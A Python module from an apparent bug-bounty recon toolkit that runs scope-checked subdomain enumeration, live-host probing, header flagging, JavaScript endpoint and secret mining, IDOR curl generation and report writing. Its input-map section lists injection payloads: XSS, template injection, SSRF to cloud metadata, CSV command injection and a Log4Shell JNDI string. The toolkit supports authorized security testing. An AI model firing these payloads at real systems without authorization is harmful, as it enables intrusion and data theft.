from __future__ import annotations

import hashlib
import json
import re
import subprocess
import time
from collections import Counter, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from urllib.parse import urlsplit

from .rich_compat import Console, Table
from .scope import ScopeEngine
from .utils import (
    DEFAULT_UA,
    HostRateLimiter,
    append_log,
    command_exists,
    ensure_dir,
    normalize_url,
    run_command,
    safe_request,
    write_json,
    write_lines,
)

console = Console()


def module_dir(output_root: Path, target: str, module: str) -> Path:
    return ensure_dir(output_root / target / module)


def summarize(path: Path, module: str, started: float, **data: object) -> None:
    data.setdefault("module", module)
    data.setdefault("time_elapsed_seconds", round(time.time() - started, 2))
    write_json(path / "module_summary.json", data)


def run_scope_check(scope: ScopeEngine, target_root: Path, confirm: bool) -> bool:
    out = ensure_dir(target_root / "scope_check")
    ok = scope.print_report(confirm=confirm)
    scope.write_parsed(out / "scope_parsed.json")
    return ok


def subdomains(scope: ScopeEngine, output_root: Path, threads: int, timeout: int, dry_run: bool, ua: str) -> None:
    started = time.time()
    target = scope.primary_target()
    out = module_dir(output_root, target, "subdomains")
    enum_roots = scope.wildcard_domains()
    exact_hosts = scope.exact_hosts()
    if enum_roots:
        console.print(f"Enumerating wildcard seeds: {', '.join(enum_roots)}")
    if exact_hosts:
        console.print(f"Exact in-scope hosts, no subdomain enum: {', '.join(exact_hosts)}")
    counts: dict[str, int] = {}
    source_results: dict[str, set[str]] = {}

    def normalize_host(value: str) -> str | None:
        if isinstance(value, bytes):
            value = value.decode("utf-8", errors="replace")
        value = value.strip().lower().rstrip(".").replace("*.", "")
        value = re.sub(r"^\w+://", "", value).split("/")[0].strip()
        if not value or "." not in value:
            return None
        if not any(value.endswith("." + root) for root in enum_roots):
            return None
        return value

    def run_tool(source: str, command: list[str]) -> tuple[str, set[str], str | None]:
        if not command_exists(command[0]):
            return source, set(), f"{command[0]} missing"
        rc, stdout, stderr = run_command(command, timeout, dry_run=dry_run)
        try:
            values = {host for line in stdout.splitlines() if (host := normalize_host(line))}
        except Exception as exc:
            return source, set(), f"parse failed: {exc}"
        return source, values, None if rc == 0 else stderr.strip()[:200]

    tasks: list[tuple[str, list[str]]] = []
    for root in enum_roots:
        tasks.extend(
            [
                ("subfinder", ["subfinder", "-d", root, "-silent", "-all", "-recursive"]),
                ("amass", ["amass", "enum", "-passive", "-d", root, "-timeout", "10"]),
                ("assetfinder", ["assetfinder", "--subs-only", root]),
                ("findomain", ["findomain", "-t", root, "--quiet"]),
            ]
        )

    errors: list[str] = []
    with ThreadPoolExecutor(max_workers=5) as pool:
        futures = [pool.submit(run_tool, name, cmd) for name, cmd in tasks]
        futures.extend(pool.submit(crtsh, root, scope, ua) for root in enum_roots)
        for future in as_completed(futures):
            try:
                name, values, error = future.result()
            except Exception as exc:
                errors.append(f"collector crashed: {exc}")
                continue
            source_results.setdefault(name, set()).update(values)
            if error:
                errors.append(f"{name}: {error}")
    all_hosts = set().union(*source_results.values()) if source_results else set()
    all_hosts.update(exact_hosts)
    counts = {source: len(values) for source, values in source_results.items()}
    buckets = {"in_scope": [], "out_of_scope": [], "ambiguous": []}
    for host in sorted(all_hosts):
        ok, reason = scope.is_in_scope(host)
        if ok:
            buckets["in_scope"].append(host)
        elif reason.startswith("excluded:"):
            buckets["out_of_scope"].append(host)
        else:
            buckets["ambiguous"].append(host)
    write_lines(out / "subdomains_raw.txt", all_hosts)
    write_lines(out / "subdomains_inscope.txt", buckets["in_scope"])
    write_lines(out / "subdomains_outofscope.txt", buckets["out_of_scope"])
    write_lines(out / "subdomains_ambiguous.txt", buckets["ambiguous"])
    write_json(out / "dedup_stats.json", overlap_stats(source_results))
    live = resolve_live_hosts(out, buckets["in_scope"], scope, threads, timeout, dry_run)
    print_counts(counts, len(all_hosts), buckets)
    summarize(out, "subdomains", started, tool_versions={}, counts_per_source=counts, total_findings=len(all_hosts), errors=errors, live_hosts=len(live))


def crtsh(root: str, scope: ScopeEngine, ua: str) -> tuple[str, set[str], str | None]:
    import requests

    root = root.lstrip("*.").strip(".").lower()
    url = f"https://crt.sh/?q=%.{root}&output=json"
    if root not in scope.wildcard_domains():
        return "crt.sh", set(), f"{root} is not a wildcard enumeration seed"
    try:
        response = requests.get(url, headers={"User-Agent": ua}, timeout=20)
        response.raise_for_status()
        rows = response.json()
        values: set[str] = set()
        for row in rows:
            for item in str(row.get("name_value", "")).splitlines():
                item = item.strip().lower().replace("*.", "")
                if item.endswith("." + root):
                    values.add(item)
        return "crt.sh", values, None
    except Exception as exc:
        return "crt.sh", set(), str(exc)


def resolve_live_hosts(out: Path, hosts: list[str], scope: ScopeEngine, threads: int, timeout: int, dry_run: bool) -> list[dict[str, object]]:
    if not command_exists("httpx") or dry_run:
        write_json(out / "live_hosts.json", [])
        write_lines(out / "live_hosts.txt", [])
        return []
    input_path = out / "subdomains_inscope.txt"
    command = [
        "httpx",
        "-l",
        str(input_path),
        "-silent",
        "-status-code",
        "-title",
        "-tech-detect",
        "-follow-redirects",
        "-threads",
        str(threads),
        "-json",
    ]
    rc, stdout, stderr = run_command(command, timeout, dry_run=False)
    live: list[dict[str, object]] = []
    for line in stdout.splitlines():
        try:
            row = json.loads(line)
        except json.JSONDecodeError:
            continue
        url = row.get("url") or row.get("input")
        if not url or not scope.is_in_scope(str(url))[0]:
            continue
        live.append(
            {
                "url": url,
                "status_code": row.get("status_code"),
                "title": row.get("title"),
                "technologies": row.get("tech", []),
                "server_header": row.get("webserver"),
                "content_length": row.get("content_length"),
                "redirect_url": row.get("location"),
                "ip": row.get("host"),
                "interesting": interesting_host(row),
            }
        )
    write_json(out / "live_hosts.json", live)
    write_lines(out / "live_hosts.txt", [str(item["url"]) for item in live])
    return live


def interesting_host(row: dict[str, object]) -> list[str]:
    reasons: list[str] = []
    title = str(row.get("title") or "").lower()
    url = str(row.get("url") or row.get("input") or "").lower()
    status = int(row.get("status_code") or 0)
    if status == 200 and any(word in title for word in ["admin", "dashboard", "internal", "staging", "dev", "test"]):
        reasons.append("interesting title")
    if re.search(r"//(?:admin|dev|staging|internal|test|beta|api)\.", url):
        reasons.append("interesting subdomain prefix")
    if status == 403:
        reasons.append("forbidden but alive")
    if not title:
        reasons.append("no title")
    return reasons


def print_counts(counts: dict[str, int], total: int, buckets: dict[str, list[str]]) -> None:
    table = Table(title="Subdomain results")
    table.add_column("Source")
    table.add_column("Count", justify="right")
    for source, count in sorted(counts.items()):
        table.add_row(source, str(count))
    table.add_row("Total unique", str(total))
    table.add_row("In scope", str(len(buckets["in_scope"])))
    table.add_row("Out of scope", str(len(buckets["out_of_scope"])))
    table.add_row("Ambiguous", str(len(buckets["ambiguous"])))
    console.print(table)


def overlap_stats(source_results: dict[str, set[str]]) -> dict[str, object]:
    stats = {"sources": {k: len(v) for k, v in source_results.items()}, "overlap": {}}
    sources = sorted(source_results)
    for i, left in enumerate(sources):
        for right in sources[i + 1 :]:
            stats["overlap"][f"{left}::{right}"] = len(source_results[left] & source_results[right])
    return stats


def headers(scope: ScopeEngine, output_root: Path, threads: int, timeout: int, ua: str, rate: float) -> None:
    started = time.time()
    target = scope.primary_target()
    out = module_dir(output_root, target, "headers")
    live_path = output_root / target / "subdomains" / "live_hosts.json"
    hosts = json.loads(live_path.read_text(encoding="utf-8")) if live_path.exists() else []
    if not hosts:
        hosts = scope_seed_hosts(scope)
        console.print(f"[yellow]No live_hosts.json entries found; using {len(hosts)} host(s) from scope.[/yellow]")
    paths = ["/", "/robots.txt", "/sitemap.xml", "/.well-known/security.txt", "/api", "/api/v1", "/api/v2", "/graphql", "/admin", "/health", "/status"]
    all_headers: dict[str, dict[str, dict[str, str]]] = defaultdict(dict)
    freq: Counter[str] = Counter()
    flagged: list[str] = []
    limiter = HostRateLimiter(rate)

    def fetch(host_row: dict[str, object], path: str) -> tuple[str, str, dict[str, str], list[str]]:
        base = str(host_row.get("url"))
        url = normalize_url(base).rstrip("/") + path
        response = safe_request("GET", url, scope, timeout=5, ua=ua, rate_limiter=limiter)
        if not response:
            return base, path, {}, []
        headers_map = dict(response.headers)
        reasons = flag_headers(headers_map)
        return base, path, headers_map, reasons

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = [pool.submit(fetch, host, path) for host in hosts for path in paths]
        for future in as_completed(futures):
            host, path, headers_map, reasons = future.result()
            all_headers[host][path] = headers_map
            for name in headers_map:
                freq[name.lower()] += 1
            for reason in reasons:
                line = f"{host} {path} {reason}"
                flagged.append(line)
                console.print(f"[yellow]{line}[/yellow]")
    write_json(out / "headers_all.json", all_headers)
    rare = [f"{count}\t{name}" for name, count in sorted(freq.items(), key=lambda item: (item[1], item[0])) if count <= 2]
    write_lines(out / "headers_rare.txt", rare)
    write_lines(out / "headers_flagged.txt", flagged)
    summarize(out, "headers", started, total_findings=len(flagged), counts_per_source={"hosts": len(hosts)}, errors=[])


def scope_seed_hosts(scope: ScopeEngine) -> list[dict[str, object]]:
    hosts: list[dict[str, object]] = []
    seen: set[str] = set()
    for entry in scope.in_scope_entries:
        if entry.kind == "wildcard" or not entry.host:
            continue
        candidates: list[str]
        if entry.kind == "url":
            scheme = entry.scheme or "https"
            path = entry.path or ""
            candidates = [f"{scheme}://{entry.host}{path}"]
        elif entry.kind == "host":
            candidates = [f"https://{entry.host}", f"http://{entry.host}"]
        else:
            candidates = []
        for url in candidates:
            ok, _ = scope.is_in_scope(url)
            if ok and url not in seen:
                seen.add(url)
                hosts.append({"url": url, "source": "scope"})
    return hosts


def flag_headers(headers_map: dict[str, str]) -> list[str]:
    name_patterns = re.compile(r"^(x-user|x-account|x-internal|x-debug|x-dev-|x-forwarded-user|x-real-ip|x-original-|x-backend-|x-service-|x-request-id|x-powered-by|x-aspnet|x-runtime|x-amz-|x-ratelimit-)", re.I)
    value_patterns = re.compile(r"(internal|staging|dev|debug|true|admin|\b1\b|eyJ|(?:10|192\.168|172\.(?:1[6-9]|2\d|3[01]))\.)", re.I)
    flagged = []
    for name, value in headers_map.items():
        reasons = []
        if name_patterns.search(name):
            reasons.append("interesting header name")
        if value_patterns.search(value):
            reasons.append("interesting header value")
        if reasons:
            flagged.append(f"{name}: {value} ({', '.join(reasons)})")
    return flagged


def js_mine(scope: ScopeEngine, output_root: Path, threads: int, timeout: int, dry_run: bool, ua: str, rate: float) -> None:
    started = time.time()
    target = scope.primary_target().lstrip("*.").strip(".")
    out = module_dir(output_root, target, "js_mine")
    js_dir = ensure_dir(out / "js_files")
    source_results: dict[str, set[str]] = {}
    collector_target = target.lstrip("*.").strip(".")
    collectors = [
        ("gospider", ["gospider", "-s", f"https://{collector_target}", "-d", "3", "-t", "10", "--js", "-q"]),
        ("hakrawler", ["hakrawler", "-js", "-d", "3", "-t", "10"]),
        ("gau", ["gau", collector_target, "--blacklist", "png,jpg,gif,css,woff,ttf,svg"]),
        ("waybackurls", ["waybackurls", collector_target]),
    ]

    def collect(name: str, command: list[str]) -> tuple[str, set[str], str | None]:
        if not command_exists(command[0]):
            return name, set(), f"{command[0]} missing"
        if name == "hakrawler":
            proc = subprocess.run(command, input=f"https://{collector_target}\n", capture_output=True, text=True, timeout=timeout, check=False)
            stdout = proc.stdout
            err = None if proc.returncode == 0 else proc.stderr[:200]
        else:
            _, stdout, err = run_command(command, timeout, dry_run=dry_run)
        urls = set()
        for token in re.findall(r"https?://[^\s\"'<>]+", stdout):
            normalized = normalize_url(token)
            if (normalized.endswith(".js") or "/static/" in normalized or "/assets/" in normalized) and scope.is_in_scope(normalized)[0]:
                urls.add(normalized)
        return name, urls, err

    errors: list[str] = []
    with ThreadPoolExecutor(max_workers=4) as pool:
        for future in as_completed([pool.submit(collect, name, cmd) for name, cmd in collectors]):
            name, urls, err = future.result()
            source_results[name] = urls
            if err:
                errors.append(f"{name}: {err}")
    unique = set().union(*source_results.values()) if source_results else set()
    write_json(out / "dedup_stats.json", overlap_stats(source_results))
    write_lines(out / "js_urls.txt", unique)
    limiter = HostRateLimiter(rate)
    contents: dict[str, str] = {}
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = [pool.submit(download_js, url, js_dir, scope, ua, limiter) for url in unique]
        for future in as_completed(futures):
            result = future.result()
            if result:
                path, text = result
                contents[path] = text
    combined = "\n".join(f"\n/* FILE: {name} */\n{text}" for name, text in contents.items())
    (out / "combined.js").write_text(combined, encoding="utf-8")
    findings = analyze_js(contents | {"combined.js": combined}, target)
    write_json(out / "js_findings.json", findings)
    write_lines(out / "js_endpoints.txt", {f["value"] for f in findings if f["category"] == "endpoint"})
    write_lines(out / "js_secrets.txt", {f'{f["file"]}:{f["line_number"]}: {f["value"]}' for f in findings if f["category"] == "secret"})
    counts = {k: len(v) for k, v in source_results.items()}
    print_counts(counts, len(unique), {"in_scope": list(unique), "out_of_scope": [], "ambiguous": []})
    summarize(out, "js_mine", started, counts_per_source=counts, total_findings=len(findings), errors=errors)


def download_js(url: str, js_dir: Path, scope: ScopeEngine, ua: str, limiter: HostRateLimiter) -> tuple[str, str] | None:
    response = safe_request("GET", url, scope, timeout=10, ua=ua, rate_limiter=limiter)
    if not response or response.status_code >= 400:
        return None
    digest = hashlib.sha1(url.encode("utf-8")).hexdigest()[:10]
    name = Path(urlsplit(url).path).name or "script.js"
    path = js_dir / f"{digest}_{name}"
    path.write_text(response.text, encoding="utf-8", errors="ignore")
    return path.name, response.text


def analyze_js(contents: dict[str, str], target: str) -> list[dict[str, object]]:
    patterns = [
        ("endpoint", re.compile(r"""["'`](/(?:api|v\d+|graphql|rest|internal|admin)[^"'`\s]*?)["'`]""")),
        ("endpoint", re.compile(r"""fetch\(["'`]([^"'`]+)["'`]\)""")),
        ("endpoint", re.compile(r"""axios\.(?:get|post|put|delete)\(["'`]([^"'`]+)""")),
        ("parameter", re.compile(r"\b(token|key|secret|apikey|api_key|auth|password|passwd|pwd|admin|debug|internal|staging|test|dev|user_id|account_id|role|permission|bypass|override|superuser|is_admin)\b", re.I)),
        ("secret", re.compile(r"AKIA[0-9A-Z]{16}|eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+|(?:key|secret|token)[^'\"]{0,20}[a-zA-Z0-9]{32,45}|(?:192\.168\.|10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)|[a-z0-9.-]+\.(?:internal|local|corp)", re.I)),
        ("third_party", re.compile(rf"https?://(?![^/]*{re.escape(target)})[a-zA-Z0-9.-]+\.[a-zA-Z]{{2,}}")),
        ("config", re.compile(r"(featureFlag|feature_flag|config|CONFIG|settings|SETTINGS)\s*[=:]\s*\{[^}]*\}", re.S)),
    ]
    seen: set[tuple[str, str, str]] = set()
    findings: list[dict[str, object]] = []
    for file_name, text in contents.items():
        lines = text.splitlines()
        for category, regex in patterns:
            for match in regex.finditer(text):
                value = match.group(1) if match.groups() else match.group(0)
                line_no = text[: match.start()].count("\n") + 1
                context = lines[line_no - 1][:300] if line_no - 1 < len(lines) else ""
                key = (category, value, file_name)
                if key in seen:
                    continue
                seen.add(key)
                findings.append({"file": file_name, "category": category, "value": value, "line_number": line_no, "context": context})
    return findings


def input_map(output_root: Path, target: str, fields: list[str]) -> None:
    out = module_dir(output_root, target, "input_map")
    sections = ["UI", "email", "PDF", "webhook", "CSV", "logs"]
    payloads = {
        "UI": ["<script>alert(1)</script>", "\" autofocus onfocus=alert(1) x=\""],
        "email": ["{{7*7}}", "<img src=x onerror=alert(1)>"],
        "PDF": ["<h1>test</h1>", "file:///etc/passwd"],
        "webhook": ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/"],
        "CSV": ["=cmd|' /C calc'!A0", "=HYPERLINK(\"https://example.com\")"],
        "logs": ["\nINJECTED_LOG_LINE", "${jndi:ldap://example.com/a}"],
    }
    lines = ["# Input Reflection Map", ""]
    for field in fields:
        lines.append(f"## {field}")
        for section in sections:
            lines.append(f"- [ ] Reflection in {section}")
            lines.append(f"  - Payloads: `{payloads[section][0]}`, `{payloads[section][1]}`")
            lines.append("  - Burp: compare request/response, search proxy history, and inspect async side effects.")
        lines.append("")
    (out / "input_map.md").write_text("\n".join(lines), encoding="utf-8")
    console.print(f"Wrote {out / 'input_map.md'}")


def idor_gen(output_root: Path, target: str, spec_file: Path) -> None:
    import yaml

    out = module_dir(output_root, target, "idor_gen")
    spec = yaml.safe_load(spec_file.read_text(encoding="utf-8"))
    base = (spec.get("servers") or [{"url": ""}])[0].get("url", "")
    commands: list[str] = []
    for path, methods in spec.get("paths", {}).items():
        if "{" not in path:
            continue
        for method, details in methods.items():
            if method.lower() not in {"get", "post", "put", "patch", "delete"}:
                continue
            headers = []
            for param in details.get("parameters", []):
                if param.get("in") == "header" and param.get("required"):
                    headers.extend(["-H", f"'{param['name']}: REPLACE_ME'"])
            url = base.rstrip("/") + re.sub(r"\{[^}]+\}", "1", path)
            commands.append(f"curl -i -X {method.upper()} {' '.join(headers)} '{url}'")
    write_lines(out / "idor_targets.txt", commands)
    write_lines(out / "burp_intruder_payloads.txt", ["1", "2", "3", "100", "1000", "abc123", "00000000-0000-4000-8000-000000000000"])
    console.print(f"Wrote {len(commands)} IDOR curl targets")


def report(output_root: Path, target: str) -> None:
    out = module_dir(output_root, target, "report")
    answers = {
        "bug_type": input("Bug type: "),
        "endpoint": input("Endpoint: "),
        "severity": input("Severity: "),
        "steps": input("Steps to reproduce: "),
        "impact": input("Impact: "),
    }
    cvss = cvss_score()
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    text = f"""# {answers['bug_type']}

**Endpoint:** {answers['endpoint']}
**Severity:** {answers['severity']}
**CVSS:** {cvss}

## Steps to Reproduce
{answers['steps']}

## Impact
{answers['impact']}
"""
    path = out / f"report_{timestamp}.md"
    path.write_text(text, encoding="utf-8")
    console.print(f"Wrote {path}")


def cvss_score() -> float:
    console.print("CVSS quick score. Use H/L/N values where prompted.")
    impact = input("Impact High/Low/None [H/L/N]: ").strip().upper()
    exploit = input("Exploitability High/Low [H/L]: ").strip().upper()
    score = 0.0
    score += {"H": 6.0, "L": 3.0, "N": 0.0}.get(impact, 0.0)
    score += {"H": 3.0, "L": 1.0}.get(exploit, 1.0)
    return min(10.0, score)
